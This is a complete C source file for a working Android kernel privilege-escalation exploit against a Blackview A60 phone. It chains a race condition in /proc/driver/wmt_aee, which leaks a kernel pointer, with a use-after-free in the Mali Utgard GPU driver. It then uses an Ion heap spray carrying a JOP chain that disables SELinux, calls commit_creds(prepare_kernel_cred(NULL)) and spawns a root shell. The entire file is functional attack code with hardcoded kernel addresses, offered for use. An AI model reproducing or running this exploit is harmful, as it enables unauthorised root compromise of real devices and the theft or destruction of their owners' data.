#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/syscall.h>
#include <sys/xattr.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <pthread.h>
#include <sched.h>

// Configuration

// addresses for getting root
#define PREPARE_KERNEL_CRED_ADDR 0xc0140e60
#define COMMIT_CREDS_ADDR 0xc014092c
#define SELINUX_ENFORCING_ADDR 0xc10b6238
#define KMALLOC_CALLER_ADDR 0xc085367c

// exploit stuff
#define HARDCODED_ION_ADDRESS 0xD25C8400 // 0xD2440400 also seems good
#define PATTERN_SIZE 0x100

#define FAKE_MALI_ALLOC_BUFF_SIZE 96

// Mali definitions
#define MALI_IOC_MEM_ALLOC 0xC0288300
#define MALI_IOC_MEM_FREE 0xC0108301
#define MALI_IOC_MEM_UNBIND 0xC0108303

// Ion configuration
#define ION_HEAP_ID 10
#define ION_ALLOC_SIZE 480000 * 1024

// wmt_aee pointer extraction
#define WMT_AEE_PATH "/proc/driver/wmt_aee"
#define LEAK_POINTER_OFFSET 0xd828

// wmt_aee race configuration
#define NUM_THREADS 2
#define CHUNK_SIZE 0x1000
#define SKIP_SIZE 0x0

// Type definitions

typedef struct
{
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t vsize;
    uint32_t psize;
    uint32_t flags;
    uint64_t backend_handle;
    int32_t secure_shared_fd;
} _mali_uk_alloc_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t gpu_vaddr;
    uint32_t free_pages_nr;
} _mali_uk_free_mem_s;

typedef struct
{
    uint64_t ctx;
    uint32_t flags;
    uint32_t vaddr;
} _mali_uk_unbind_mem_s;

typedef struct
{
    void *addr;
    size_t size;
    int success;
} mmap_result_t;

#define KEY_SPEC_PROCESS_KEYRING -2
#define KEYCTL_REVOKE 3

typedef int32_t key_serial_t;

// Ion definitions

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_SHARE _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
#define ION_IOC_FREE _IOWR(ION_IOC_MAGIC, 1, struct ion_fd_data)

struct ion_allocation_data
{
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};

struct ion_fd_data
{
    int handle;
    int fd;
};

typedef struct
{
    int ion_fd;
    int buf_fd;
    void *mapped;
    size_t size;
} ion_spray_ctx_t;

// Global state for wmt_aee race

volatile int race_start = 0;
int race_fd1 = -1;
int race_fd2 = -1;

// Syscall wrappers

static inline key_serial_t add_key(const char *type, const char *desc,
                                   const void *payload, size_t plen,
                                   key_serial_t ringid)
{
    return syscall(__NR_add_key, type, desc, payload, plen, ringid);
}

static inline long keyctl_revoke(key_serial_t key)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, key);
}

// JOP-chain pattern stuff

typedef struct
{
    uint32_t pattern[PATTERN_SIZE];
    uint8_t written[PATTERN_SIZE];
} PatternBuffer;

void pattern_init(PatternBuffer *pb, uint32_t fill_value)
{
    for (size_t i = 0; i < PATTERN_SIZE; i++)
    {
        pb->pattern[i] = fill_value;
        pb->written[i] = 0x0;
    }
}

void pattern_set(PatternBuffer *pb, size_t offset, uint32_t value)
{
    if (offset % 4 != 0)
    {
        fprintf(stderr, "[ERROR] Unaligned offset 0x%zx\n", offset);
        exit(1);
    }

    size_t idx = offset / 4;

    if (idx >= PATTERN_SIZE)
    {
        fprintf(stderr, "[ERROR] Offset 0x%zx out of bounds\n", offset);
        exit(1);
    }

    if (pb->written[idx])
    {
        fprintf(stderr, "[CONFLICT] Offset 0x%zx written twice!\n", offset);
    }

    pb->pattern[idx] = value;
    pb->written[idx] = 0x1;
}

#define P(pb, off, val) pattern_set(pb, off, val)

// Ion spray functions

void ion_spray_init(ion_spray_ctx_t *ctx)
{
    ctx->ion_fd = -1;
    ctx->buf_fd = -1;
    ctx->mapped = NULL;
    ctx->size = 0;
}

int ion_try_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size, int *out_fd)
{
    struct ion_allocation_data alloc = {0};
    struct ion_fd_data fd_data = {0};

    alloc.len = size;
    alloc.align = 0x1000;
    alloc.heap_id_mask = (1 << heap_id);
    alloc.flags = 0;

    if (ioctl(ctx->ion_fd, ION_IOC_ALLOC, &alloc) < 0)
    {
        return -1;
    }

    /* Convert handle to fd */
    fd_data.handle = alloc.handle;
    if (ioctl(ctx->ion_fd, ION_IOC_SHARE, &fd_data) < 0)
    {
        /* Free the handle on failure */
        ioctl(ctx->ion_fd, ION_IOC_FREE, &(struct ion_fd_data){.handle = alloc.handle});
        return -1;
    }

    *out_fd = fd_data.fd;
    return 0;
}

int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
{
    printf("[*] Ion spray: allocating %zu bytes from heap %u\n", size, heap_id);

    /* Open /dev/ion */
    ctx->ion_fd = open("/dev/ion", O_RDONLY);
    if (ctx->ion_fd < 0)
    {
        perror("[!] Failed to open /dev/ion");
        return -1;
    }
    printf("[+] Opened /dev/ion (fd=%d)\n", ctx->ion_fd);

    /* Allocate from ion */
    if (ion_try_alloc(ctx, heap_id, size, &ctx->buf_fd) < 0)
    {
        printf("[!] Ion allocation failed: %s\n", strerror(errno));
        close(ctx->ion_fd);
        ctx->ion_fd = -1;
        return -1;
    }
    printf("[+] Ion allocation successful, buffer fd = %d\n", ctx->buf_fd);

    /* Map into userspace */
    ctx->mapped = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, ctx->buf_fd, 0);
    if (ctx->mapped == MAP_FAILED)
    {
        printf("[!] Ion mmap failed: %s\n", strerror(errno));
        close(ctx->buf_fd);
        close(ctx->ion_fd);
        ctx->buf_fd = -1;
        ctx->ion_fd = -1;
        ctx->mapped = NULL;
        return -1;
    }

    ctx->size = size;
    printf("[+] Ion mapped at userspace address: %p\n", ctx->mapped);

    // build JOP patterm
    PatternBuffer pb;
    pattern_init(&pb, 0xcc921010);

    P(&pb, 0x34, 0xc041b724); // first gadget

    // need to do the following:
    // - get a kmalloc-128 allocation (call 0xc085367c)
    // - overwrite first 4 bytes with 0x0 to break freelist loop
    // - set enforcing to 0x0
    // - commit_creds(prepare_kernel_cred(NULL))

    // First we gotta save off important shizzle which we will innevitably rek

    // c041b724 8c 20 93 e5     ldr        r2,[r3,#0x8c]
    // c041b728 00 10 a0 e1     cpy        r1,r0
    // c041b72c 03 00 a0 e1     cpy        r0,r3            // jop chain addr now in r0 and r3
    // c041b730 32 ff 2f e1     blx        r2
    P(&pb, 0x8c, 0xc0427918); // P(&pb, 0x8c, 0xc042790c); // r2, next gadget address

    // c0427918 1c 30 90 e5     ldr        r3,[r0,#0x1c]
    // c042791c 00 50 a0 e1     cpy        r5,r0
    // c0427920 24 00 90 e5     ldr        r0,[r0,#0x24]
    // c0427924 01 60 a0 e1     cpy        r6,r1
    // c0427928 33 ff 2f e1     blx        r3
    P(&pb, 0x1c, 0xc018c2ec); // r3, next gadget address
    P(&pb, 0x24, HARDCODED_ION_ADDRESS); // r0, reset to jop chain addr

    // now do the kmalloc-128, jop chain addr in r0 and r5 rn

    //   c018c2ec 40 30 90 e5     ldr        r3,[r0,#0x40]
    //   c018c2f0 00 10 a0 e1     cpy        r1,r0
    //   c018c2f4 05 00 a0 e1     cpy        r0,r5
    //   c018c2f8 33 ff 2f e1     blx        r3
    P(&pb, 0x40, 0xc01c272c); // r3, next gadget

    //   c01c272c 08 30 90 e5     ldr        r3,[r0,#0x8]
    //   c01c2730 20 40 93 e5     ldr        r4,[r3,#0x20]
    //   c01c2734 00 00 54 e3     cmp        r4,#0x0
    //   c01c2738 f6 ff ff 0a     beq        LAB_c01c2718
    //   c01c273c 34 ff 2f e1     blx        r4
    uint32_t r3_offset = 0x2c;
    P(&pb, 0x8, HARDCODED_ION_ADDRESS + r3_offset);  // r3
    P(&pb, 0x20 + r3_offset, 0xc0416360); // r4, addr of next gadget

    // we need r3 to be jop chain, and r1 to be jop chain
    //   c0416360 24 30 93 e5     ldr        r3,[r3,#0x24]
    //   c0416364 00 60 a0 e1     cpy        r6,r0
    //   c0416368 04 00 a0 e1     cpy        r0,r4
    //   c041636c 01 70 a0 e1     cpy        r7,r1
    //   c0416370 33 ff 2f e1     blx        r3
    P(&pb, 0x24 + r3_offset, 0xc04e7018); // r3, next gadget addr

    //   c04e7018 18 30 97 e5     ldr        r3,[r7,#0x18]
    //   c04e701c 00 00 53 e3     cmp        r3,#0x0
    //   c04e7020 00 00 00 0a     beq        LAB_c04e7028
    //   c04e7024 33 ff 2f e1     blx        r3
    //   c04e7028 0c 30 97 e5     ldr        r3,[r7,#0xc]
    //   c04e702c 33 ff 2f e1     blx        r3
    P(&pb, 0x18, KMALLOC_CALLER_ADDR); // r3, fun to call
    P(&pb, 0xc, 0xc0103c98);           // r3, next gadget

    // write zero to it

    //   c0103c98 00 c0 97 e5     ldr        r12,[r7,#0x0]
    //   c0103c9c 00 20 a0 e1     cpy        r2,r0
    //   c0103ca0 04 00 a0 e1     cpy        r0,r4
    //   c0103ca4 3c ff 2f e1     blx        r12
    P(&pb, 0x0, 0xc049541c); // r12, address of next gadget

    //   c049541c b4 00 95 e5     ldr        r0,[r5,#0xb4]
    //   c0495420 14 30 90 e5     ldr        r3,[r0,#0x14]
    //   c0495424 1c 30 93 e5     ldr        r3,[r3,#0x1c]
    //   c0495428 06 00 53 e1     cmp        r3,r6
    //   c049542c 01 00 00 0a     beq        LAB_c0495438
    //   c0495430 06 10 a0 e1     cpy        r1,r6
    //   c0495434 33 ff 2f e1     blx        r3
    P(&pb, 0xb4, HARDCODED_ION_ADDRESS);               // r0, addr of jop chain
    P(&pb, 0x14, HARDCODED_ION_ADDRESS + 0x28 - 0x1c); // r3, addr of addr of next gadget
    P(&pb, 0x28, 0xc07c5238);               // r3, addr of next gagdet

    //   c07c5238 2c 30 95 e5     ldr        r3,[r5,#0x2c]
    //   c07c523c 04 00 a0 e1     cpy        r0,r4
    //   c07c5240 30 60 95 e5     ldr        r6,[r5,#0x30]
    //   c07c5244 33 ff 2f e1     blx        r3
    P(&pb, 0x2c, 0xc063d928); // r3, address of next gadget
    P(&pb, 0x30, 0xc066bd0c); // r6, address of gadget after next

    //   c063d928 98 00 95 e5     ldr        r0,[r5,#0x98]
    //   c063d92c b0 30 97 e5     ldr        r3,[r7,#0xb0]
    //   c063d930 36 ff 2f e1     blx        r6
    uint32_t r0_offset = 0x54;
    P(&pb, 0x98, HARDCODED_ION_ADDRESS + r0_offset); // r0, might be useful for moving along JOP
    P(&pb, 0xb0, 0x0);                    // r3, must be zero!

    //   c066bd0c 00 30 82 e5     str        r3,[r2,#0x0]
    //   c066bd10 20 30 91 e5     ldr        r3,[r1,#0x20]
    //   c066bd14 00 00 53 e3     cmp        r3,#0x0
    //   c066bd18 03 00 a0 01     cpyeq      r0,r3
    //   c066bd1c 0c 00 00 0a     beq        LAB_c066bd54
    //   c066bd20 33 ff 2f e1     blx        r3
    P(&pb, 0x20, 0xc04549c8); // r3, addr of next gadget

    // cool, now set enforcing to zero (SELINUX_ENFORCING_ADDR)
    // r0 CAN contain shifted JOP-chain
    // r1, r5, r7 contains unshifted jop chain

    //   c04549c8 ec 31 90 e5     ldr        r3,[r0,#0x1ec]
    //   c04549cc cc 50 90 e5     ldr        r5,[r0,#0xcc]
    //   c04549d0 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x1ec, 0xc018c2ec);                   // r3, addr of next gadget (0x1f0)
    P(&pb, r0_offset + 0xcc, SELINUX_ENFORCING_ADDR - 0x7c); // r3, addr of next gadget (0xd0)

    //   c018c2ec 40 30 90 e5     ldr        r3,[r0,#0x40]
    //   c018c2f0 00 10 a0 e1     cpy        r1,r0
    //   c018c2f4 05 00 a0 e1     cpy        r0,r5
    //   c018c2f8 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x40, 0xc065fe40); // r3, addr of next gadget

    // shifted jop now in r1, r0 contains selinux enforcing address

    //   c065fe40 00 30 a0 e3     mov        r3,#0x0
    //   c065fe44 7c 30 80 e5     str        r3,[r0,#0x7c]
    //   c065fe48 54 30 91 e5     ldr        r3,[r1,#0x54]
    //   c065fe4c 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x54, 0xc05c1f14); // r3, addr of next gadget

    // call prepare_kernel_creds(NULL), r1 is shifted so look above

    //   c05c1f14 8c 30 91 e5     ldr        r3,[r1,#0x8c]
    //   c05c1f18 01 00 a0 e1     cpy        r0,r1
    //   c05c1f1c 01 40 a0 e1     cpy        r4,r1
    //   c05c1f20 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x8c, 0xc041635c); // r3, addr of next gadget

    //   c041635c 4c 30 94 e5     ldr        r3,[r4,#0x4c]
    //   c0416360 24 30 93 e5     ldr        r3,[r3,#0x24]
    //   c0416364 00 60 a0 e1     cpy        r6,r0
    //   c0416368 04 00 a0 e1     cpy        r0,r4
    //   c041636c 01 70 a0 e1     cpy        r7,r1
    //   c0416370 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x4c, HARDCODED_ION_ADDRESS + r0_offset + 0x34 - 0x24); // r3, addr of addr of next gadget
    P(&pb, r0_offset + 0x34, 0xc04c1308);                           // r3, addr of next gadget

    //   c04c1308 48 30 90 e5     ldr        r3,[r0,#0x48]
    //   c04c130c 00 00 a0 e3     mov        r0,#0x0
    //   c04c1310 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x48, 0xc04e7018); // r3, addr of next gadget

    //   c04e7018 18 30 97 e5     ldr        r3,[r7,#0x18]
    //   c04e701c 00 00 53 e3     cmp        r3,#0x0
    //   c04e7020 00 00 00 0a     beq        LAB_c04e7028
    //   c04e7024 33 ff 2f e1     blx        r3
    //   c04e7028 0c 30 97 e5     ldr        r3,[r7,#0xc]
    //   c04e702c 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + 0x18, PREPARE_KERNEL_CRED_ADDR); // r3, func to execute
    P(&pb, r0_offset + 0xc, 0xc061c768);                // r3, addr of next gadget

    // now call commit_creds, shifted jop in r4, r6, r7, unshifted in r9
    // maintain r0

    //   c061c768 64 70 94 e5     ldr        r7,[r4,#0x64]
    //   c061c76c 28 30 97 e5     ldr        r3,[r7,#0x28]
    //   c061c770 00 00 53 e3     cmp        r3,#0x0
    //   c061c774 03 50 02 03     movweq     r5,#0x2003
    //   c061c778 13 00 00 0a     beq        LAB_c061c7cc
    //   c061c77c 33 ff 2f e1     blx        r3
    uint32_t r7_offset = 0x68;
    P(&pb, r0_offset + 0x64, HARDCODED_ION_ADDRESS + r0_offset + r7_offset); // r7
    P(&pb, r0_offset + r7_offset + 0x28, 0xc04e7018);             // r3, addr of next gadget

    //   c04e7018 18 30 97 e5     ldr        r3,[r7,#0x18]
    //   c04e701c 00 00 53 e3     cmp        r3,#0x0
    //   c04e7020 00 00 00 0a     beq        LAB_c04e7028
    //   c04e7024 33 ff 2f e1     blx        r3
    //   c04e7028 0c 30 97 e5     ldr        r3,[r7,#0xc]
    //   c04e702c 33 ff 2f e1     blx        r3
    P(&pb, r0_offset + r7_offset + 0x18, COMMIT_CREDS_ADDR); // r3, func to execute
    P(&pb, r0_offset + r7_offset + 0xc, 0xc02830dc);         // r3, addr of next gadget, clashes with r4 + 0x14 in earlier gadget, cock

    /* Copy pattern repeatedly into destination buffer */
    unsigned char *buf = (unsigned char *)ctx->mapped;
    const size_t chunk_size = sizeof(pb.pattern);

    for (size_t i = 0; i < size; i += chunk_size)
    {
        size_t chunk = (size - i < chunk_size) ? (size - i) : chunk_size;
        memcpy(buf + i, pb.pattern, chunk);
    }

    return 0;
}

void ion_spray_free(ion_spray_ctx_t *ctx)
{
    printf("[*] Cleaning up Ion allocation...\n");
    if (ctx->mapped && ctx->mapped != MAP_FAILED)
    {
        munmap(ctx->mapped, ctx->size);
        ctx->mapped = NULL;
    }
    if (ctx->buf_fd >= 0)
    {
        close(ctx->buf_fd);
        ctx->buf_fd = -1;
    }
    if (ctx->ion_fd >= 0)
    {
        close(ctx->ion_fd);
        ctx->ion_fd = -1;
    }
    ctx->size = 0;
}

// wmt_aee race condition exploit
void *race_thread(void *arg)
{
    int id = (int)(long)arg;
    int my_fd = (id == 0) ? race_fd1 : race_fd2;

    while (!race_start)
    {
        asm volatile("" ::: "memory");
    }

    char buf[300];
    ssize_t n = read(my_fd, buf, 300);
    return NULL;
}

// Read chunks and extract pointer from the underflowed fd
int leak_pointer_from_wmt_aee(int fd, uint32_t *out_pointer)
{
    char *chunk = malloc(CHUNK_SIZE);
    if (!chunk)
    {
        perror("malloc");
        return -1;
    }

    size_t skip_amount = SKIP_SIZE;
    size_t total_skipped = 0;
    int chunk_num = 0;

    uint32_t pointer_value = 0;
    int pointer_found = 0;

    // Phase 1: Skip bytes if needed
    if (skip_amount > 0)
    {
        printf("    Skipping 0x%zx bytes...\n", skip_amount);

        while (total_skipped < skip_amount)
        {
            size_t to_read = ((skip_amount - total_skipped) < CHUNK_SIZE) ? (skip_amount - total_skipped) : CHUNK_SIZE;
            ssize_t n = read(fd, chunk, to_read);

            if (n <= 0)
            {
                free(chunk);
                return -1;
            }

            total_skipped += n;
            chunk_num++;
        }
    }

    // Phase 2: Read until we find the pointer
    size_t total_read = 0;
    size_t read_limit = LEAK_POINTER_OFFSET + 0x100; // Read just past the pointer

    printf("[*] Reading to offset 0x%zx to extract target pointer...\n", read_limit);

    while (total_read < read_limit && !pointer_found)
    {
        size_t remaining = read_limit - total_read;
        size_t to_read = (remaining < CHUNK_SIZE) ? remaining : CHUNK_SIZE;

        ssize_t n = read(fd, chunk, to_read);

        if (n <= 0)
        {
            break;
        }

        // Check if this chunk contains the pointer
        size_t chunk_start_offset = total_skipped + total_read;
        size_t chunk_end_offset = chunk_start_offset + n;

        if (LEAK_POINTER_OFFSET >= chunk_start_offset && LEAK_POINTER_OFFSET + 4 <= chunk_end_offset)
        {
            size_t offset_in_chunk = LEAK_POINTER_OFFSET - chunk_start_offset;

            pointer_value = ((unsigned char)chunk[offset_in_chunk]) |
                            ((unsigned char)chunk[offset_in_chunk + 1] << 8) |
                            ((unsigned char)chunk[offset_in_chunk + 2] << 16) |
                            ((unsigned char)chunk[offset_in_chunk + 3] << 24);

            pointer_found = 1;
        }

        total_read += n;
        chunk_num++;
        usleep(5000);
    }

    free(chunk);

    if (pointer_found)
    {
        *out_pointer = pointer_value;
        return 0; // Success
    }

    return -1; // Failed to find pointer
}

int trigger_wmt_aee_race_and_leak(uint32_t *out_pointer)
{
    pthread_t threads[NUM_THREADS];
    struct sched_param param;

    param.sched_priority = sched_get_priority_max(SCHED_FIFO);
    sched_setscheduler(0, SCHED_FIFO, &param);

    printf("[*] Starting wmt_aee race to leak pointer...\n");
    printf("[*] Target offset: 0x%x\n", LEAK_POINTER_OFFSET);

    for (int attempt = 0; attempt < 100000; attempt++)
    {
        if (attempt % 100 == 0)
        {
            printf("[*] Race attempt %d\n", attempt + 1);
        }

        race_fd1 = open(WMT_AEE_PATH, O_RDONLY);
        if (race_fd1 < 0)
        {
            continue;
        }

        race_fd2 = open(WMT_AEE_PATH, O_RDONLY);
        if (race_fd2 < 0)
        {
            close(race_fd1);
            continue;
        }

        char init_buf[8];
        ssize_t n1 = read(race_fd1, init_buf, 8);
        ssize_t n2 = read(race_fd2, init_buf, 8);

        if (n1 <= 0 || n2 <= 0)
        {
            close(race_fd1);
            close(race_fd2);
            continue;
        }

        race_start = 0;

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setschedpolicy(&attr, SCHED_FIFO);
        pthread_attr_setschedparam(&attr, &param);

        for (long i = 0; i < NUM_THREADS; i++)
        {
            pthread_create(&threads[i], &attr, race_thread, (void *)i);
        }

        pthread_attr_destroy(&attr);
        usleep(1000);
        race_start = 1;

        for (int i = 0; i < NUM_THREADS; i++)
        {
            pthread_join(threads[i], NULL);
        }

        // Test for underflow
        char test_buf[2048];
        ssize_t n = read(race_fd1, test_buf, sizeof(test_buf));

        if (n > 1000)
        {
            printf("[+] Underflow detected on fd1\n");
            if (leak_pointer_from_wmt_aee(race_fd1, out_pointer) == 0)
            {
                close(race_fd1);
                close(race_fd2);
                return 0;
            }
            close(race_fd1);
            close(race_fd2);
            continue;
        }

        n = read(race_fd2, test_buf, sizeof(test_buf));

        if (n > 1000)
        {
            printf("[+] Underflow detected on fd2\n");
            if (leak_pointer_from_wmt_aee(race_fd2, out_pointer) == 0)
            {
                close(race_fd1);
                close(race_fd2);
                return 0;
            }
            close(race_fd1);
            close(race_fd2);
            continue;
        }

        close(race_fd1);
        close(race_fd2);
        usleep(10000);
    }

    printf("[-] Failed to trigger race after 100000 attempts\n");
    return -1;
}

// Mali exploit functions

void important_ascii_art()
{
    printf("\n\033[38;5;225m");
    printf("███████ ██████  ███████ ██      ███████ \n");
    printf("\033[38;5;183m");
    printf("██      ██   ██ ██      ██      ██      \n");
    printf("\033[38;5;141m");
    printf("█████   ██████  █████   ██      ███████ \n");
    printf("\033[38;5;99m");
    printf("██      ██   ██ ██      ██           ██ \n");
    printf("\033[38;5;57m");
    printf("██      ██   ██ ███████ ███████ ███████ \n\n");
    printf("             Blackview A60\n");
    printf("\n\033[0m");
}

_mali_uk_alloc_mem_s mali_alloc_memory(int mali_fd, _mali_uk_alloc_mem_s input)
{
    _mali_uk_alloc_mem_s result = input;

    int ret = ioctl(mali_fd, MALI_IOC_MEM_ALLOC, &result);

    if (ret == -1)
    {
        printf("  ERROR: %s (errno: %d)\n", strerror(errno), errno);
    }

    return result;
}

mmap_result_t mali_mmap_allocation(int mali_fd, uint32_t gpu_vaddr, const char *label)
{
    mmap_result_t mapping;

    printf("[+] Memory mapping GPU address 0x%08x (%s)...\n", gpu_vaddr, label);

    void *mapped_addr = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED,
                             mali_fd, gpu_vaddr);

    mapping.size = 4096;

    if (mapped_addr == MAP_FAILED)
    {
        mapping.addr = NULL;
        mapping.success = 0;
        printf("[-] Mapping failed: %s\n", strerror(errno));
    }
    else
    {
        mapping.addr = mapped_addr;
        mapping.success = 1;
        printf("[+] Successfully mapped at %p\n", mapped_addr);
    }

    return mapping;
}

int trigger_overwritten_function_pointer()
{
    int fd = open("/proc/driver/wmt_aee", O_RDONLY);
    if (fd < 0)
    {
        perror("[-] Failed to open /proc/driver/wmt_aee");
        return -1;
    }
    printf("[*] Opened /proc/driver/wmt_aee (fd=%d), and hopefully got root...\n", fd);

    if (getuid() == 0)
    {
        printf("[+] We got root! Popping shell...\n");
        char *shell = "/system/bin/sh";
        char *args[] = {shell, "-i", NULL};
        execve(shell, args, NULL);
    }
    else
    {
        printf("[-] Utgard won the battle but not the war... try again\n");
    }

    close(fd);

    return 0;
}

int main()
{
    important_ascii_art();

    int mali_fd;
    ion_spray_ctx_t ion_ctx;
    uint32_t extracted_proc_struct_addr = 0;

    ion_spray_init(&ion_ctx);

    // Extract pointer from wmt_aee via race condition
    printf("\033[38;5;99m###############################################################\033[0m\n");
    printf("\033[38;5;99m# \033[0mSTAGE 1: Extracting pointer from wmt_aee via race condition \033[38;5;99m#\n");
    printf("\033[38;5;99m###############################################################\033[0m\n");

    if (trigger_wmt_aee_race_and_leak(&extracted_proc_struct_addr) != 0)
    {
        printf("[-] Failed to extract pointer, aborting\n");
        return -1;
    }
    printf("[+] Leaked /proc/driver/wmt_aee proc_dir_entry pointer: \033[38;5;183m0x%08X\033[0m\n", extracted_proc_struct_addr);

    printf("[*] Sleeping 15 secs to let the kernel relax\n");
    for (int i = 0; i < 15; i++){
        sleep(1);
        printf("[*] %d\n", i);
    }

    // Mali UAF exploit (run 10 times)
    printf("\n");
    printf("\033[38;5;99m##############################################################\033[0m\n");
    printf("\033[38;5;99m# \033[0mSTAGE 2: Mali Utgard UAF exploit (running 10 times)        \033[38;5;99m#\n");
    printf("\033[38;5;99m##############################################################\033[0m\n");

    // Allocate Ion buffer
    if (ion_spray_alloc(&ion_ctx, ION_HEAP_ID, ION_ALLOC_SIZE) < 0)
    {
        printf("[-] Ion allocation failed, aborting\n");
        return -1;
    }

    for (int uaf_attempt = 0; uaf_attempt < 10; uaf_attempt++)
    {
        printf("\n\033[38;5;99m~~~~~~~~~~~~ \033[0mATTEMPT %d\033[38;5;99m ~~~~~~~~~~~~\033[0m\n", uaf_attempt + 1);

        mali_fd = open("/dev/mali", O_RDWR);
        if (mali_fd < 0)
        {
            perror("[-] Failed to open /dev/mali");
            continue;
        }
        printf("[+] Successfully opened /dev/mali (fd=%d)\n", mali_fd);

        // STEP 1: Allocate victim mali_alloc
        printf("\n[1] Allocate victim mali_alloc (refcount = 1)\n");
        _mali_uk_alloc_mem_s victim_mali_alloc_input = {0};
        victim_mali_alloc_input.ctx = 0;
        victim_mali_alloc_input.gpu_vaddr = 0x0;
        victim_mali_alloc_input.vsize = 4096;
        victim_mali_alloc_input.psize = 4096;
        victim_mali_alloc_input.flags = 0x0;
        victim_mali_alloc_input.backend_handle = 0;
        victim_mali_alloc_input.secure_shared_fd = 0;

        _mali_uk_alloc_mem_s result = mali_alloc_memory(mali_fd, victim_mali_alloc_input);

        printf("[+] Mali allocation successful!\n");
        printf("    GPU VAddr: 0x%08x\n", result.gpu_vaddr);
        printf("    Backend Handle: 0x%08llx\n", (unsigned long long)result.backend_handle);

        // STEP 2: First mmap
        printf("\n[2] First mmap - vma1 (refcount = 2)\n");

        uint32_t victim_mmap_offset = result.gpu_vaddr;
        mmap_result_t mapping_vma1 = mali_mmap_allocation(mali_fd, victim_mmap_offset, "vma1");

        if (!mapping_vma1.success)
        {
            printf("[-] Failed to create first mapping\n");
            close(mali_fd);
            continue;
        }

        // STEP 3: Second mmap
        printf("\n[3] Second mmap - vma2 (refcount = 3)\n");

        mmap_result_t mapping_vma2 = mali_mmap_allocation(mali_fd, victim_mmap_offset, "vma2");

        if (!mapping_vma2.success)
        {
            printf("[-] Failed to create second mapping\n");
            munmap(mapping_vma1.addr, mapping_vma1.size);
            close(mali_fd);
            continue;
        }

        // STEP 4: First MALI_IOC_MEM_FREE
        printf("\n[4] First MALI_IOC_MEM_FREE (refcount 3 -> 2)\n");

        _mali_uk_free_mem_s free_params;
        memset(&free_params, 0, sizeof(free_params));
        free_params.ctx = result.ctx;
        free_params.gpu_vaddr = result.gpu_vaddr;

        int ioc_result = ioctl(mali_fd, MALI_IOC_MEM_FREE, &free_params);
        if (ioc_result != 0)
        {
            printf("[-] FREE failed: %s\n", strerror(errno));
        }

        // STEP 5: Second MALI_IOC_MEM_FREE
        printf("\n[5] Second MALI_IOC_MEM_FREE (refcount 2 -> 1)\n");

        ioc_result = ioctl(mali_fd, MALI_IOC_MEM_FREE, &free_params);
        if (ioc_result != 0)
        {
            printf("[-] FREE failed: %s\n", strerror(errno));
        }

        // STEP 6: Setup fake mali_alloc
        printf("\n[6] Setting up fake mali_alloc payload\n");

        uint32_t fake_mali_alloc_buff[FAKE_MALI_ALLOC_BUFF_SIZE / 4];
        memset(fake_mali_alloc_buff, 0x0, sizeof(fake_mali_alloc_buff));

        // refcount = 1 so UAF trigger causes free
        fake_mali_alloc_buff[0x4c / 4] = 0x00000001;

        // mali_alloc->mali_vma_node field
        fake_mali_alloc_buff[0x3c / 4] = 0x00000000;

        // session pointer
        fake_mali_alloc_buff[0xc / 4] = (uintptr_t)0xC12E482C - 0xe8;

        // additional fields
        fake_mali_alloc_buff[0x28 / 4] = 0x00000000;

        // list pointers for arbitrary write
        fake_mali_alloc_buff[0x40 / 4] = HARDCODED_ION_ADDRESS;
        fake_mali_alloc_buff[0x44 / 4] = (extracted_proc_struct_addr + 0x24);

        // STEP 7: Unmap vma2 to trigger FREE
        printf("\n[7] Unmapping vma2 (triggers FREE, refcount 1 -> 0)\n");
        munmap(mapping_vma2.addr, mapping_vma2.size);

        // STEP 8: Spray to reclaim freed object with fake mali_alloc
        printf("\n[8] Spraying with add_key to reclaim freed object\n");

        key_serial_t spray_key = add_key("user", "spray_reclaim", fake_mali_alloc_buff,
                                         sizeof(fake_mali_alloc_buff), KEY_SPEC_PROCESS_KEYRING);

        // STEP 9: Trigger UAF
        printf("\n[9 + 10] Unmapping orphaned vma1 (TRIGGERS UAF -> arbitrary write), then trigger JOP-chain\n");

        munmap(mapping_vma1.addr, mapping_vma1.size);

        // STEP 10: Trigger JOP chain
        trigger_overwritten_function_pointer();

        // Cleanup for this attempt
        if (spray_key > 0)
        {
            keyctl_revoke(spray_key);
        }
        close(mali_fd);

        usleep(50000); // Small delay before next attempt
    }

    printf("\n[+] Completed 10 UAF attempts!\n");

    // Cleanup

    printf("\n[*] Cleanup\n");

    ion_spray_free(&ion_ctx);

    printf("\n[*] Done!\n");

    return 0;
}
